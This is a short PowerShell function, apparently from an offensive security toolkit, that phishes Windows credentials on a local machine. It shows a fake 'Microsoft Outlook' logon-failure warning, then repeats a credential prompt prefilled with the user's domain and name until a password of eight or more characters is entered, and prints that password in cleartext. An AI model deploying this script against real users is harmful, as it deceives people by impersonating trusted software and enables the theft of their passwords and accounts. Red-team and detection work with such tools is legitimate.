function Invoke-CredBox() {

[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")

[System.Windows.Forms.MessageBox]::Show("Outlook cannot log on.  Verify you are connected to the network and are using the proper server and mailbox name. The Microsoft Exchange information service in your profile is missing required information. Modify your profile to ensure that you are using the correct Microsoft Exchange information service.","Microsoft Outlook",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)

while ($true) {

    $credential = $host.ui.PromptForCredential("Credentials Required", "Please enter your user name and password.", "$env:userdomain\$env:username", "NetBiosUserName")

    if ($credential) {

        $clear = $credential.Password | ConvertFrom-SecureString
        $password = $credential.GetNetworkCredential().password

        if ($password.Length -gt 7) {


            echo ""
            $env:username
            $password
            echo ""

            break

            }

        }

    }

}